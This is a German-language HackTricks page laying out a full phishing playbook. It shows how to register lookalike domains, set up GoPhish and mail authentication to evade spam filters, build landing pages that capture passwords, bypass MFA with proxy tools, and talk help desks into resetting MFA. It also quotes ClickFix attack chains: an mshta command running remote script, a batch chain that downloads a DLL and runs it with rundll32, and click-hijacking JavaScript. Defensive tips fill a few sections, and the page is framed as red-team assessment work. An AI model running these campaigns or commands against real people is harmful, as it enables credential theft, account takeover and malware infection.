# Phishing-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Opfer auskundschaften
1. Die **Opfer-Domain** auswählen.
2. Eine grundlegende Web-Aufzählung durchführen, **nach Login-Portalen suchen**, die vom Opfer verwendet werden, und **entscheiden**, welches davon du **imitieren** wirst.
3. **OSINT** verwenden, um **E-Mail-Adressen zu finden**.
2. Umgebung vorbereiten
1. Die **Domain kaufen**, die du für die Phishing-Bewertung verwenden wirst
2. Die zugehörigen Einträge des **E-Mail-Service konfigurieren** (SPF, DMARC, DKIM, rDNS)
3. Den VPS mit **gophish** konfigurieren
3. Kampagne vorbereiten
1. Das **E-Mail-Template** vorbereiten
2. Die **Webseite** zum Stehlen der Zugangsdaten vorbereiten
4. Kampagne starten!

## Ähnliche Domainnamen generieren oder eine vertrauenswürdige Domain kaufen

### Techniken zur Variation von Domainnamen

- **Keyword**: Der Domainname **enthält ein wichtiges **Keyword** der ursprünglichen Domain (z. B. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Bindestrich-Subdomain**: Den **Punkt durch einen Bindestrich** einer Subdomain ersetzen (z. B. www-zelster.com).
- **Neue TLD**: Dieselbe Domain mit einer **neuen TLD** verwenden (z. B. zelster.org)
- **Homoglyph**: Einen Buchstaben im Domainnamen durch **ähnlich aussehende Buchstaben** ersetzen (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Zwei Buchstaben innerhalb des Domainnamens **vertauschen** (z. B. zelsetr.com).
- **Singularisierung/Pluralisierung**: Am Ende des Domainnamens ein „s“ hinzufügen oder entfernen (z. B. zeltsers.com).
- **Auslassung**: Einen der Buchstaben aus dem Domainnamen **entfernen** (z. B. zelser.com).
- **Wiederholung:** Einen der Buchstaben im Domainnamen **wiederholen** (z. B. zeltsser.com).
- **Ersetzung**: Wie Homoglyph, aber weniger unauffällig. Einen der Buchstaben im Domainnamen ersetzen, möglicherweise durch einen Buchstaben in der Nähe des ursprünglichen Buchstabens auf der Tastatur (z. B. zektser.com).
- **Subdomainbildung**: Einen **Punkt** innerhalb des Domainnamens einfügen (z. B. ze.lster.com).
- **Einfügung**: Einen Buchstaben in den Domainnamen **einfügen** (z. B. zerltser.com).
- **Fehlender Punkt**: Die TLD an den Domainnamen anhängen (z. B. zelstercom.com)

**Automatische Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webseiten**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es besteht die **Möglichkeit, dass einige der gespeicherten oder übertragenen Bits automatisch umgekippt werden**, aufgrund verschiedener Faktoren wie Sonneneruptionen, kosmischer Strahlung oder Hardwarefehlern.

Wenn dieses Konzept auf **DNS-Anfragen angewendet wird**, ist es möglich, dass die **vom DNS-Server empfangene Domain** nicht mit der ursprünglich angeforderten Domain übereinstimmt.

Beispielsweise kann eine Änderung eines einzelnen Bits in der Domain „windows.com“ diese in „windnws.com“ ändern.

Angreifer können sich dies **zunutze machen, indem sie mehrere Bitflipping-Domains registrieren**, die der Domain des Opfers ähneln. Ihr Ziel ist es, legitime Benutzer auf ihre eigene Infrastruktur umzuleiten.

Weitere Informationen findest du unter [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Eine vertrauenswürdige Domain kaufen

Du kannst unter [https://www.expireddomains.net/](https://www.expireddomains.net) nach einer abgelaufenen Domain suchen, die du verwenden könntest.\
Um sicherzustellen, dass die abgelaufene Domain, die du kaufen möchtest, **bereits eine gute SEO-Bewertung** hat, kannst du prüfen, wie sie kategorisiert ist unter:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-Mail-Adressen entdecken

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % kostenlos)
- [https://phonebook.cz/](https://phonebook.cz) (100 % kostenlos)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um **weitere** gültige E-Mail-Adressen zu **entdecken** oder die bereits **entdeckten Adressen zu überprüfen**, kannst du prüfen, ob du sie per Brute-Force gegen die SMTP-Server des Opfers testen kannst. [Hier erfährst du, wie du E-Mail-Adressen verifizieren/entdecken kannst](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Vergiss außerdem nicht: Wenn die Benutzer **ein Webportal für den Zugriff auf ihre E-Mails verwenden**, kannst du prüfen, ob es für **Username-Brute-Force** anfällig ist, und die Schwachstelle nach Möglichkeit ausnutzen.

## GoPhish konfigurieren

### Installation

Du kannst es unter [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) herunterladen.

Lade es herunter, entpacke es in `/opt/gophish` und führe `/opt/gophish/gophish` aus.\
In der Ausgabe wird dir ein Passwort für den Admin-Benutzer auf Port 3333 angezeigt. Rufe diesen Port daher auf und verwende diese Zugangsdaten, um das Admin-Passwort zu ändern. Möglicherweise musst du diesen Port zu deinem lokalen Rechner tunneln:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguration

**Konfiguration des TLS-Zertifikats**

Vor diesem Schritt solltest du die **Domain, die du verwenden wirst, bereits gekauft haben**, und sie muss auf die **IP des VPS** zeigen, auf dem du **gophish** konfigurierst.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail-Konfiguration**

Beginne mit der Installation: `apt-get install postfix`

Füge anschließend die Domain zu den folgenden Dateien hinzu:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ändere außerdem die Werte der folgenden Variablen in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Ändere abschließend die Dateien **`/etc/hostname`** und **`/etc/mailname`** zu deinem Domainnamen und **starte deinen VPS neu.**

Erstelle nun einen **DNS-A-Record** für `mail.<domain>`, der auf die **IP-Adresse** des VPS zeigt, sowie einen **DNS-MX-Record**, der auf `mail.<domain>` zeigt.

Jetzt testen wir das Senden einer E-Mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-Konfiguration**

Stoppe die Ausführung von gophish und konfiguriere es.\
Ändere `/opt/gophish/config.json` wie folgt (beachte die Verwendung von https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service konfigurieren**

Um den gophish service zu erstellen, damit er automatisch gestartet und als service verwaltet werden kann, kannst du die Datei `/etc/init.d/gophish` mit folgendem Inhalt erstellen:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Schließe die Konfiguration des Dienstes ab und überprüfe ihn mit:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mailserver und Domain konfigurieren

### Warten und seriös wirken

Je älter eine Domain ist, desto geringer ist die Wahrscheinlichkeit, dass sie als Spam erkannt wird. Daher solltest du vor dem Phishing-Assessment so lange wie möglich warten (mindestens 1 Woche). Wenn du außerdem eine Seite über einen angesehenen Bereich einrichtest, wird die erzielte Reputation besser sein.

Beachte, dass du auch dann, wenn du eine Woche warten musst, jetzt bereits alles konfigurieren kannst.

### Reverse-DNS-(rDNS-)Record konfigurieren

Lege einen rDNS-(PTR-)Record fest, der die IP-Adresse des VPS in den Domainnamen auflöst.

### Sender Policy Framework (SPF)-Record

Du musst **einen SPF-Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Richtlinie zu generieren (verwende die IP-Adresse des VPS).

![SPF-Wizard-Formular zum Generieren eines SPF-Records für eine Phishing-Domain](<../../images/image (1037).png>)

Dies ist der Inhalt, der innerhalb eines TXT-Records in der Domain festgelegt werden muss:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domainbasierte Message Authentication, Reporting & Conformance (DMARC)-Record

Sie müssen **einen DMARC-Record für die neue Domain konfigurieren**. Wenn Sie nicht wissen, was ein DMARC-Record ist, [**lesen Sie diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Sie müssen einen neuen DNS-TXT-Record erstellen, der auf den Hostnamen `_dmarc.<domain>` mit folgendem Inhalt verweist:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Du musst **einen DKIM für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Du musst beide vom DKIM key generierten B64-Werte verketten:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste den Score deiner E-Mail-Konfiguration

Das kannst du mit [https://www.mail-tester.com/](https://www.mail-tester.com) tun\
Rufe einfach die Seite auf und sende eine E-Mail an die dort angegebene Adresse:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Du kannst außerdem deine **E-Mail-Konfiguration überprüfen**, indem du eine E-Mail an `check-auth@verifier.port25.com` sendest und **die Antwort liest** (dafür musst du Port **25** **öffnen** und die Antwort in der Datei _/var/mail/root_ ansehen, wenn du die E-Mail als root sendest).\
Überprüfe, dass du alle Tests bestehst:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Du könntest auch eine **Nachricht an ein Gmail-Konto unter deiner Kontrolle senden** und die **Header der E-Mail** in deinem Gmail-Posteingang überprüfen. `dkim=pass` sollte im Header-Feld `Authentication-Results` vorhanden sein.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Von der Spamhaus-Blacklist entfernen

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann Ihnen anzeigen, ob Ihre Domain von Spamhaus blockiert wird. Sie können die Entfernung Ihrer Domain/IP unter [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/) anfordern.

### Von der Microsoft-Blacklist entfernen

​​Sie können die Entfernung Ihrer Domain/IP unter [https://sender.office.com/](https://sender.office.com) anfordern.

## GoPhish Campaign erstellen und starten

### Sending Profile

- Legen Sie einen **Namen zur Identifizierung** des Senderprofils fest.
- Entscheiden Sie, von welchem Konto Sie die Phishing-E-Mails senden werden. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Sie können Benutzername und Passwort leer lassen, müssen jedoch sicherstellen, dass **Ignore Certificate Errors** aktiviert ist.

![GoPhish Campaign erstellen und starten - Sending Profile: Sie können Benutzername und Passwort leer lassen, müssen jedoch sicherstellen, dass Ignore Certificate Errors aktiviert ist](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion "**Send Test Email**" zu verwenden, um zu testen, ob alles funktioniert.\
> Ich würde empfehlen, die Test-E-Mails an 10min-Mail-Adressen zu senden, um zu vermeiden, dass Ihre Domain bei den Tests auf eine Blacklist gesetzt wird.

### Email Template

- Legen Sie einen **Namen zur Identifizierung** des Templates fest.
- Schreiben Sie anschließend einen **Betreff** (nichts Ungewöhnliches, sondern etwas, das Sie in einer regulären E-Mail erwarten würden).
- Stellen Sie sicher, dass Sie "**Add Tracking Image**" aktiviert haben.
- Schreiben Sie das **E-Mail-Template** (Sie können Variablen wie im folgenden Beispiel verwenden):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Beachte, dass **zur Erhöhung der Glaubwürdigkeit der E-Mail** empfohlen wird, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existierende Adresse** und prüfe, ob die Antwort eine Signatur enthält.
- Suche nach **öffentlichen E-Mail-Adressen** wie info@ex.com, press@ex.com oder public@ex.com, sende ihnen eine E-Mail und warte auf die Antwort.
- Versuche, eine **gültige, entdeckte** E-Mail-Adresse zu kontaktieren, und warte auf die Antwort.

![Sending Profile - Email Template: Versuche, eine gültige, entdeckte E-Mail-Adresse zu kontaktieren, und warte auf die Antwort](<../../images/image (80).png>)

> [!TIP]
> Das Email Template ermöglicht auch das **Anhängen von Dateien zum Senden**. Wenn du außerdem NTLM-Challenges mithilfe speziell erstellter Dateien/Dokumente stehlen möchtest, [lies diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Gib einen **Namen** ein.
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du Webseiten **importieren** kannst.
- Aktiviere **Capture Submitted Data** und **Capture Passwords**.
- Lege eine **Weiterleitung** fest.

![Email Template - Landing Page: Capture Submitted Data und Capture Passwords aktivieren](<../../images/image (826).png>)

> [!TIP]
> Normalerweise musst du den HTML-Code der Seite ändern und lokal einige Tests durchführen (möglicherweise mithilfe eines Apache-Servers), **bis dir die Ergebnisse gefallen.** Schreibe diesen HTML-Code anschließend in das Feld.\
> Wenn du **statische Ressourcen** für das HTML verwenden musst (beispielsweise CSS- und JS-Seiten), kannst du sie unter _**/opt/gophish/static/endpoint**_ speichern und anschließend über _**/static/\<filename>**_ darauf zugreifen.

> [!TIP]
> Für die Weiterleitung könntest du die **Benutzer auf die legitime Hauptwebseite** des Opfers weiterleiten oder sie beispielsweise zu _/static/migration.html_ weiterleiten, dort für 5 Sekunden ein **drehendes Ladesymbol (**[**https://loading.io/**](https://loading.io)**) anzeigen und anschließend angeben, dass der Vorgang erfolgreich war**.

### Users & Groups

- Lege einen Namen fest.
- **Importiere die Daten** (beachte, dass du zur Verwendung des Templates für das Beispiel den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst).

![Landing Page - Users & Groups: Importiere die Daten (beachte, dass du zur Verwendung des Templates für das Beispiel den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst)](<../../images/image (163).png>)

### Campaign

Erstelle abschließend eine Campaign, indem du einen Namen, das Email Template, die Landing Page, die URL, das Sending Profile und die Gruppe auswählst. Beachte, dass die URL der an die Opfer gesendete Link ist.

Beachte, dass das **Sending Profile das Senden einer Test-E-Mail ermöglicht, um zu sehen, wie die endgültige Phishing-E-Mail aussieht**:

![Users & Groups - Campaign: Beachte, dass das Sending Profile das Senden einer Test-E-Mail ermöglicht, um zu sehen, wie die endgültige Phishing-E-Mail aussieht](<../../images/image (192).png>)

Sobald alles bereit ist, starte einfach die Campaign!

## Website Cloning

Wenn du die Webseite aus irgendeinem Grund klonen möchtest, sieh dir die folgende Seite an:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bei einigen Phishing-Assessments (hauptsächlich für Red Teams) möchtest du möglicherweise auch **Dateien senden, die irgendeine Art von Backdoor enthalten** (vielleicht ein C2 oder einfach etwas, das eine Authentifizierung auslöst).\
Auf der folgenden Seite findest du einige Beispiele:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich clever, da du eine echte Webseite fälschst und die vom Benutzer eingegebenen Informationen sammelst. Wenn der Benutzer jedoch nicht das korrekte Passwort eingegeben hat oder die von dir gefälschte Anwendung mit 2FA konfiguriert ist, **kannst du diese Informationen nicht verwenden, um dich als der getäuschte Benutzer auszugeben**.

Hier sind Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) nützlich. Mit diesem Tool kannst du einen MitM-ähnlichen Angriff erzeugen. Grundsätzlich funktionieren die Angriffe folgendermaßen:

1. Du **imitierst das Login-Formular** der echten Webseite.
2. Der Benutzer **sendet** seine **Credentials** an deine gefälschte Seite, und das Tool sendet diese an die echte Webseite weiter, **wobei geprüft wird, ob die Credentials funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fragt die MitM-Seite danach. Sobald der **Benutzer den Code eingibt**, sendet das Tool ihn an die echte Webseite weiter.
4. Sobald der Benutzer authentifiziert ist, hast du (als Angreifer) **die Credentials, die 2FA, das Cookie und sämtliche Informationen** aus jeder Interaktion erfasst, während das Tool einen MitM durchführt.

### Via VNC

Was wäre, wenn du das Opfer nicht zu einer **bösartigen Seite** mit demselben Aussehen wie das Original schickst, sondern zu einer **VNC-Sitzung mit einem Browser, der mit der echten Webseite verbunden ist**? Du könntest sehen, was es tut, das Passwort, die verwendete MFA, die Cookies usw. stehlen.\
Dies ist mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) möglich.<sup>[[3]](#references)[[4]](#references)</sup>

## Das Erkennen der Erkennung

Eine der offensichtlich besten Möglichkeiten herauszufinden, ob du aufgeflogen bist, besteht darin, **deine Domain in Blacklists zu suchen**. Wenn sie dort aufgeführt ist, wurde deine Domain offenbar als verdächtig erkannt.\
Eine einfache Möglichkeit zu prüfen, ob deine Domain in einer Blacklist erscheint, ist die Verwendung von [https://malwareworld.com/](https://malwareworld.com).

Es gibt jedoch weitere Möglichkeiten herauszufinden, ob das Opfer **aktiv nach verdächtigen Phishing-Aktivitäten in freier Wildbahn sucht**, wie in:


{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst eine **Domain mit einem sehr ähnlichen Namen** wie die Domain des Opfers **kaufen und/oder ein Zertifikat** für eine von dir kontrollierte **Subdomain** einer Domain **erstellen**, die das **Schlüsselwort** der Domain des Opfers enthält. Wenn das **Opfer** irgendeine Art von **DNS- oder HTTP-Interaktion** mit diesen durchführt, weißt du, dass es **aktiv nach verdächtigen Domains sucht**, und du musst sehr unauffällig vorgehen.<sup>[[2]](#references)</sup>

### Das Phishing bewerten

Verwende [**Phishious** ](https://github.com/Rices/Phishious), um zu bewerten, ob deine E-Mail im Spam-Ordner landet, blockiert wird oder erfolgreich ist.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne Intrusion Sets überspringen E-Mail-Köder zunehmend vollständig und **zielen direkt auf den Service-Desk-/Identity-Recovery-Workflow**, um MFA zu umgehen. Der Angriff erfolgt vollständig nach dem Prinzip "Living off the Land": Sobald der Operator über gültige Credentials verfügt, bewegt er sich mithilfe integrierter Admin-Tools weiter – Malware ist nicht erforderlich.<sup>[[6]](#references)</sup>

### Attack flow
1. Führe Recon am Opfer durch.
* Sammle persönliche und unternehmensbezogene Informationen aus LinkedIn, Data Breaches, öffentlichem GitHub usw.
* Identifiziere besonders wertvolle Identitäten (Führungskräfte, IT, Finanzen) und ermittle den **genauen Help-Desk-Prozess** für das Zurücksetzen von Passwörtern bzw. MFA.
2. Social Engineering in Echtzeit
* Rufe den Help-Desk an, kontaktiere ihn über Teams oder chatte mit ihm, während du dich als das Ziel ausgibst (oft mit **gefälschter Anrufer-ID** oder **klonierter Stimme**).
* Stelle die zuvor gesammelten PII bereit, um die wissensbasierte Verifizierung zu bestehen.
* Überzeuge den Mitarbeiter, das **MFA-Secret zurückzusetzen** oder einen **SIM-Swap** für eine registrierte Mobilfunknummer durchzuführen.
3. Unmittelbare Aktionen nach dem Zugriff (in realen Fällen ≤60 Min.)
* Etabliere einen Foothold über ein beliebiges Web-SSO-Portal.
* Enumeriere AD / AzureAD mit integrierten Tools (keine Binaries werden abgelegt):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Führe laterale Bewegungen mit **WMI**, **PsExec** oder legitimen **RMM**-Agents durch, die in der Umgebung bereits auf der Whitelist stehen.

### Detection & Mitigation
* Behandle die Wiederherstellung von Help-Desk-Identitäten als **privilegierten Vorgang** – verlange Step-up-Authentifizierung und die Genehmigung eines Managers.
* Setze **Identity Threat Detection & Response (ITDR)**- bzw. **UEBA**-Regeln ein, die Folgendes melden:
* MFA-Methode geändert + Authentifizierung von einem neuen Gerät / aus einer neuen geografischen Region.
* Unmittelbare Rechteerhöhung desselben Principals (User-→-Admin).
* Zeichne Help-Desk-Anrufe auf und erzwinge vor jedem Reset einen **Rückruf an eine bereits registrierte Nummer**.
* Implementiere **Just-In-Time (JIT) / Privileged Access**, damit neu zurückgesetzte Konten nicht automatisch Tokens mit hohen Berechtigungen erben.

---

## At-Scale Deception – SEO Poisoning & “ClickFix”-Campaigns
Commodity Crews gleichen die Kosten von High-Touch-Operationen durch Massenangriffe aus, die **Suchmaschinen und Werbenetzwerke zum Auslieferungskanal machen**.<sup>[[6]](#references)</sup>

1. **SEO Poisoning / Malvertising** platziert ein gefälschtes Ergebnis wie `chromium-update[.]site` an oberster Stelle der Suchanzeigen.
2. Das Opfer lädt einen kleinen **First-Stage-Loader** herunter (häufig JS/HTA/ISO). Beispiele, die von Unit 42 beobachtet wurden:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies und Credential-Datenbanken und lädt anschließend einen **Silent Loader** herunter, der in Echtzeit entscheidet, ob Folgendes bereitgestellt wird:
* RAT (z. B. AsyncRAT, RustDesk)
* Ransomware / Wiper
* Persistence-Komponente (Registry Run Key + Scheduled Task)

### Hardening-Tipps
* Blockiere neu registrierte Domains und erzwinge **Advanced DNS / URL Filtering** auch für *Search Ads* sowie E-Mails.
* Beschränke die Softwareinstallation auf signierte MSI-/Store-Pakete und untersage die Ausführung von `HTA`, `ISO` und `VBS` per Policy.
* Überwache untergeordnete Prozesse von Browsern, die Installer öffnen:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Suche nach LOLBins, die häufig von First-Stage-Loadern missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### Hijacking von Klicks auf Download-Schaltflächen mit TDS-Handoff
Einige gefälschte Softwareportale lassen das sichtbare Download-`href` auf die **echte GitHub-/Release-URL** zeigen, hijacken jedoch die **erste** Benutzerinteraktion per JavaScript und leiten das Opfer stattdessen in eine **Traffic Distribution System (TDS)**-Kette weiter.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Wichtige Merkmale:
- Der Hook läuft normalerweise in der **capture phase** (`true`) auf `document`, sodass er vor den Website-Handlern ausgelöst wird.
- Chrome verwendet häufig `mousedown` statt `click`, damit die Weiterleitung an eine gültige **user gesture** gebunden bleibt und die Umgehung von Popup-Blockern verbessert wird.
- Einige Varianten öffnen vorab `about:blank` oder simulieren Klicks auf `<a target="_blank">` und weisen erst später die TDS-URL zu.
- Browserseitige Limits liegen häufig in `localStorage`, sodass der **erste Klick** Malware erreichen kann, während Aktualisierungen/Wiederholungen auf den harmlos wirkenden sichtbaren Link zurückfallen.
- Der TDS kann nach Referrer, Einstiegsdomain, GEO, Browser-/Geräte-Fingerprint, VPN-/Datacenter-Prüfungen, Klickkontext und sitzungsbezogenen Zählern filtern, wodurch Wiederholungen durch Analysten nicht deterministisch sind.

Ideen für Verteidiger:
- Vergleicht das **angezeigte** `href` mit dem **tatsächlichen** Navigationsziel, das zum Zeitpunkt des Klicks erzeugt wird.
- Sucht nach `document.addEventListener(..., true)`-Handlern, die im Zusammenhang mit `window.open`, `about:blank` oder simulierten Ankerklicks sowohl `preventDefault()` als auch `stopImmediatePropagation()` aufrufen.
- Behandelt Gruppen neu registrierter Software-Download-Domains, die alle dieselbe CloudFront-/JS-Stage laden, als eindeutiges Muster für SEO-Poisoning/TDS.

### ClickFix von gefälschten Verifizierungsseiten + LOLBAS-Fetches, die wie Archive aussehen
Einige TDS-Zweige enden auf einer gefälschten Verifizierungsseite (im Stil von Cloudflare/IUAM), die das Opfer auffordert, eine vertrauenswürdige Windows-Binärdatei auszuführen, etwa:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Hinweise:
- `mshta.exe` führt das **HTA/VBScript am Anfang der Antwort** aus, selbst wenn die URL vorgibt, ein `.7z`-Archiv zu sein; angehängte Archivdaten können ein reiner Köder sein.
- Nachfolgende Stufen täuschen häufig weiterhin den Dateityp vor (`.rtf` für PowerShell, `.asar` für Python, ZIPs mit aufgefüllten Binärdateien) und wechseln anschließend zu **manuellem PE-Mapping / In-Memory-Ausführung**.
- Wenn Sie auf eine dieser Ketten reagieren, bewahren Sie **Netzwerk + Speicher ab dem ersten erfolgreichen Lauf** auf: Spätere Wiederholungen zeigen möglicherweise nur einen harmlosen Installer-/SFX-Pfad oder schlagen fehl, weil die Freigabe des Payloads/Schlüssels an die ursprüngliche TDS-Sitzung gebunden war.

### ClickFix-DLL-Bereitstellungstaktik (gefälschtes CERT-Update)
* Köder: geklonte nationale CERT-Warnung mit einer **Update**-Schaltfläche, die schrittweise „Fehlerbehebungsanweisungen“ anzeigt. Opfer werden aufgefordert, eine Batch-Datei auszuführen, die eine DLL herunterlädt und sie über `rundll32` ausführt.<sup>[[12]](#references)</sup>
* Typische beobachtete Batch-Kette:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
